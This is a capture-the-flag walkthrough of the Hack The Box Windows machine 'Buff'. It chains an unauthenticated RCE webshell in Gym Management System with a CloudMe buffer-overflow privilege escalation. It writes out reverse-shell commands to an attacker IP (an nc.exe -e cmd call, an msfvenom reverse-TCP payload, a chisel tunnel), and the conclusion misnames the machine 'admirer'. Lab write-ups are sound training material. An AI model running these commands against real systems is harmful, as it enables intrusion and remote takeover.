# Buff

## Información General

<h3> Difficulty: <img src="https://img.shields.io/badge/Easy-Green"> </h3>

<h3> Operating system: Windows</h3>

<h3> Exploited vulnerabilitya: Gym Management System Exploitation (RCE), CloudMe Exploitation [Buffer Overflow] [Python Scripting] </h3>

<h3> Date of resolution: 13/11/2025 </h3>

<h3> Link: <a href="https://app.hackthebox.com/machines/263" target="_blank">Buff</a></h3>

### *Read this document in spanish* <a href="buff.md">Buff</a>

## Recognition

HTB provides us with the target machine's IP address: 10.129.125.113.

I'm going to set the target VM's IP address in the **/etc/hosts** file; I'll call it **buff**.

### Ping

Depending on the result, we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 10.129.125.113
```

**Its TTL is 127. Therefore, it's Windows.**

### Open Port Scan

#### TCP Port Scan

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.125.113
```

<p align="center">

<img src="images/Pasted image 20251111180400.png" width="600" alt="Resultado de Nmap">

</p>

<div align="center">

| Open port | Service | Version |
| --------- | ------- | ------- |
| 8080      | http    | -       |

</div>

## Exploration

```
http://10.129.125.113:8080/
```

<p align="center">

<img src="images/Pasted image 20251111180758.png" width="600" alt="Resultado de Nmap">
<img src="images/Pasted image 20251111191313.png" width="600" alt="Resultado de Nmap">

</p>

### Whatweb

```
./whatweb http://10.129.25.107:8080/
```

**http://10.129.25.107:8080/ [200 OK] Apache[2.4.43], Bootstrap, Cookies[sec_session_id], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], HttpOnly[sec_session_id], IP[10.129.25.107], JQuery[1.11.0,1.9.1], OpenSSL[1.1.1g], PHP[7.4.6], PasswordField[password], Script[text/JavaScript,text/javascript], Shopify, Title[mrb3n's Bro Hut], Vimeo, X-Powered-By[PHP/7.4.6], X-UA-Compatible[IE=edge]**

### Fuzzing web

```
dirb http://10.129.25.107/
```

<p align="center">

<img src="images/Pasted image 20251111190311.png" width="600" alt="Resultado de Nmap">

</p>

Half the pages ask me for superuser permissions.

Therefore, I'm going to try using the **searchsploit** tool, which attempts to find exploits for the framework the page uses, called **gym management**.

```
searchsploit gym management
```

<p align="center">

<img src="images/Pasted image 20251112103505.png" width="600" alt="Resultado de Nmap">
<img src="images/Pasted image 20251112103532.png" width="600" alt="Resultado de Nmap">
</p>

We downloaded the exploit for **Gym Management System 1.0 - Unauthenticated Remote Code Execution** using the following command:

```
searchsploit -m php/webapps/48506.py 
```

To run the exploit, **python2** will be needed.

```
python2 48506.py "http://10.129.125.113:8080/"
```

<p align="center">

<img src="images/Pasted image 20251112105457.png" width="600" alt="Resultado de Nmap">

</p>

The user is **shaun**

Sometimes this exploit doesn't work; restart Kali or the victim machine and it might work again. At least that's how it worked for me.

The idea now would be to move this session to our Kali server; we would do that with **netcat**.

## Exploitation

### Reverse Shell from a Windows VM to my Kali

Then I download it on my Kali <a href="https://eternallybored.org/misc/netcat/" target="_blank">**netcat**</a>

<p align="center">
<img src="images/Pasted image 20251112120952.png" width="600" alt="Resultado de Nmap">
</p>

Then we enter the following command inside the **netcat** folder:

```
impacket-smbserver smbFolder $(pwd) -smb2support
```

Next, I will explain how I constructed the following route to use it in the browser:

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=
```

I need to see the exploit we used earlier (48506.py). We can see that it's saved in the **upload/kamehameha.php** path using the **telepathy** parameter.

<p align="center">
<img src="images/Pasted image 20251112122140.png" width="600" alt="Resultado de Nmap">
</p>

Therefore, if we write:

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=whoami 
```

Adding this keyboard shortcut **control + u**, we get the following:

<p align="center">
<img src="images/Pasted image 20251112122557.png" width="600" alt="Resultado de Nmap">
</p>

However, what we really want is something else: to view the shared **smbFolder** folder. To do this, we type the following:

```
http://IPMAQUINA-VICTIMA:PUERTO-DONDE-SE-ALOJA/RUTA?PARAMETRO=dir \\IPATACANTE\NOMBRE-DE-LA-CARPETA-QUE-COMPARTES\
```
```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=dir \\10.10.14.82\smbFolder\
```

Adding this keyboard shortcut **control + u**, we get the following:

<p align="center">
<img src="images/Pasted image 20251112122823.png" width="600" alt="Resultado de Nmap">
</p>

First, you need to have the listening port activated:

```
rlwrap nc -lvnp 443
```

Next, the **nc.exe** file will be used to open a **shell** on our attacker's machine; the command to do this would be:

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=\\10.10.14.82\smbFolder\nc.exe -e cmd 10.10.14.82 443
```

<p align="center">
<img src="images/Pasted image 20251112124457.png" width="600" alt="Resultado de Nmap">
</p>

We can check how we access the shell of our VM, we can close the browser below and continue.

While investigating the system within the home directory of user **shaun**, I found an .exe file called **CloudMe_1112.exe** in the downloads folder. I then searched for this file using the **searchsploit** tool with the following command.

```
searchsploit CloudMe
```

<p align="center">
<img src="images/Pasted image 20251112161948.png" width="600" alt="Resultado de Nmap">
</p>

I came across this file that caught my attention. While investigating what this exploit does, in short, it allows me to gain superuser privileges through a vulnerability in this app related to buffer overflow.

```
searchsploit -m windows/remote/48389.py
```

```
http://10.129.125.113:8080/upload/kamehameha.php?telepathy=netstat -ano
```

<p align="center">
<img src="images/Pasted image 20251112163223.png" width="600" alt="Resultado de Nmap">
</p>

Upon investigation, I discovered that port 8888 is open by the CloudMe app.

**WARNING** This connection is quite unstable, so climbing will be very difficult.

## Escalada de Privilegios

### Explicación buffer over flow

Let's look at script 48389.py

<p align="center">
<img src="images/Pasted image 20251113112407.png" width="600" alt="Resultado de Nmap">
</p>

The goal is basically to replace the payload

```
msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
```

for this:

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.82 LPORT=4444 -b '\x00\x0A\x0D' -f python -v payload
```

Result:

<p align="center">
<img src="images/Pasted image 20251113131757.png" width="600" alt="Resultado de Nmap">
</p>

Final objective:

<p align="center">
<img src="images/Pasted image 20251113132035.png" width="600" alt="Resultado de Nmap">
</p>

I'll call this new script **cloudme.py**. This will give us a session with the highest privileges. **NOTE: This might cause problems because port 88 is unstable.** In the browser, enter the following:

```
view-source:http://10.129.130.220:8080/upload/kamehameha.php?telepathy=copy \\10.10.14.82\\smbFolder\chisel.exe
```

In my Kali machine, where I'm sharing, there's a file called **chisel.exe** that I'll copy to the Windows machine; I downloaded the file here.

```
https://github.com/jpillora/chisel/releases/tag/v1.11.3
```

<p align="center">
<img src="images/Pasted image 20251113132632.png" width="600" alt="Resultado de Nmap">
</p>

Then, to establish a connection, I need to have this installed on my Kali machine:

<p align="center">
<img src="images/Pasted image 20251113132942.png" width="600" alt="Resultado de Nmap">
</p>

Once each chisel is installed on the machines, we will do the following:

In my Kali we write:

```
gunzip chisel_1.11.3_linux_amd64.deb
chmod +x
./chisel_1.11.3_linux_386 server -p 1234 --reverse
```

<p align="center">
<img src="images/Pasted image 20251113133646.png" width="600" alt="Resultado de Nmap">
</p>

On the Windows machine, in the browser:

```
view-source:http://10.129.130.220:8080/upload/kamehameha.php?telepathy=chisel.exe client 10.10.14.82:1234 R:8888:127.0.0.1:8888
```

As a result, this will appear in my Kali:

<p align="center">
<img src="images/Pasted image 20251113134009.png" width="600" alt="Resultado de Nmap">
</p>

I've configured port 8888 on the Windows machine hosting CloudMe on my Kali machine using Chisel. The next step is to configure the listening port on my Kali machine.

```
rlwrap nc -lvnp 4444
```

Then run the cloudme.py script

```
python3 cloudme.py
```

Once the connection is established, we quickly try to obtain the root flag (because the connection is very unstable).

```
type \Users\Administrator\Desktop\root.txt
```

<p align="center">
<img src="images/Pasted image 20251113134358.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusion

The HTB machine **admirer** proved spectacular from start to finish. We began with port **8080 (HTTP)** open, and upon exploring the application, I identified it as a **Gym Management** system. Using **searchsploit**, I located a suitable exploit and, after executing it with **python2**, we gained initial (albeit unstable) access, so we continued interacting primarily through the browser. Within the **shaun** user's directory, I found a binary called **cloudme**; again, I searched for exploits with **searchsploit** and found one based on **buffer overflow**, replacing the payload with one generated using **msfvenom** to obtain a reverse shell with elevated privileges. To route ourselves to the remote port, I installed **chisel** on Windows and my Kali machine and tunneled port **8888 (cloudme)** to my machine. After setting up the listener on port **4444** and running the **cloudme.py** exploit with **python3**, I gained access with a superuser account. In short: a pretty awful machine because the connection is quite unstable, and if it's your first time, as it was in my case, learning how buffer over flow works is going to be very frustrating.